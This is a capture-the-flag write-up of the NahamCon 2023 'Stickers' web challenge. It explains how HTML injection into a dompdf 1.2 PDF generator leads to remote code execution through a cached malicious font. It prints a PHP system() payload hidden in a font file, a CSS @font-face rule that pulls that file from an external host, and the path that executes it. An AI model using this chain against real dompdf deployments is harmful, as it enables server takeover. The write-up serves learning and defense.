---
title: NahamCon CTF 2023 - Stickers
date: 2023-06-20 09:00:00 +0800
categories: [NahamCon CTF 2023, Web]
tags: [web, dompdf, xss, css]
media_subpath: /assets/img/ctfs/nahamcon2023/stickers/
image:
  path: stickers.jpg
---

## Info

| Name                                                                       | Difficulty | Author                                       |
|----------------------------------------------------------------------------|------------|:---------------------------------------------|
| [Stickers](https://github.com/v3he/ctfs/tree/master/nahamcon2023/stickers) | Hard       | [congon4tor](https://twitter.com/congon4tor) |

> Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!
{: .prompt-info }

## Recon

The first thing we see when we open the website is a form for what appears to be a purchase of stickers for our organization, let's fill it in to continue.

![Stickers Main Page](main.png)

A report in pdf format is generated with the information we have entered. The first thing that strikes me is the URL, all the parameters have been entered there.

```
quote.php?organisation=MegaCorp&email=megacorp%40mcp.com&small=100&medium=100&large=100
```
{: .nolineno }

In addition we see that it is made with php, that is also useful information.

![First Order](order-one.png)

If we look at the information of the generated pdf from the browser itself, we can see that `dompdf 1.2` is being used for the generation.

![PDF Info](info.png)

Playing a little with the parameters, you can see that it is vulnerable to `XSS`, you can not do everything, but for example if we can modify the organization parameter from `organisation=MegaCorp` to `organisation=<strong>MegaCorp</strong>` and it is reflected in the pdf.

![XSS in the pdf](xss.png)

## Vulnerability 

After a quick search for `dompdf 1.2 exploit`, we can find several interesting results that talk about this:

- [From XSS to RCE (dompdf 0day)](https://positive.security/blog/dompdf-rce)
- [Dompdf RCE](https://exploit-notes.hdks.org/exploit/web/dompdf-rce/)
- [dompdf security alert: RCE vulnerability found in popular PHP PDF library](https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/)

> Dompdf is an HTML to PDF converter for PHP. Its version ≤ 1.2.0 is vulnerable to remote code execution.
{: .prompt-info }

### How it Works

In this first [blog](https://positive.security/blog/dompdf-rce) we can see a super detailed explanation of what is going on, but in a nutshell the exploitation would be something like the following:

The vulnerability allows us to use XSS to inject a css link with a malicious source written in php, which stays in the dompdf cache and is accessible from the web, so we can locate it and execute the php code. These would be the steps to follow:

1. create a php file with the code to be injected and make it accessible remotely
2. create a css file that loads as font the previous php file, also accessible remotely
3. inject via XSS a link pointing to our css file
4. font is cached by dompdf
5. calculate md5 of the font
6. access the font from the webpage, the URL should be similar to `/dompdf/lib/fonts/<font name>_normal_<md5 hash>.php`

## Exploit

### Malicious Font

You can find the original exploit in [positive-security repository](https://github.com/positive-security/dompdf-rce/blob/main/exploit/exploit_font.php).

I have simply made a modification so that instead of showing the phpinfo, it shows the flag we are looking for. Host it in a repo so that it is accessible externally, in my case this will be the URL `https://raw.githubusercontent.com/v3he/ctfs/master/nahamcon2023/stickers/superfont.php`, and this is the content:

```php
[... Font Content ...]
<?php system("cat /flag.txt"); ?>
```

### Malicious CSS

The same but with a css file in which we specify as font url the php file we created previously.

```css
@font-face {
    font-style: 'normal';
    font-weight: 'normal';
    font-family: 'superfont';
    src: url('https://raw.githubusercontent.com/v3he/ctfs/master/nahamcon2023/stickers/superfont.php');
}
```

### Inject through XSS

Fill in the form again but put a link to the css source in the organization field.

![XSS Exploit](exploit.png)

### Calculate MD5

Get the MD5 of the php file.

```bash
$ echo -n 'https://raw.githubusercontent.com/v3he/ctfs/master/nahamcon2023/stickers/superfont.php' | md5sum
f8906bb81c22d91235d89d3073b73638
```
{: .nolineno }

### Get the Flag

If we now access `/dompdf/lib/fonts/superfont_normal_f8906bb81c22d91235d89d3073b73638.php`, we can see that the php code has indeed been executed and we have the flag.

![Flag](flag.png)

## Final Thoughts

A different challenge, very entertaining and nothing I've seen before, so overall a 9, even though I see it more as a medium challenge than a difficult one.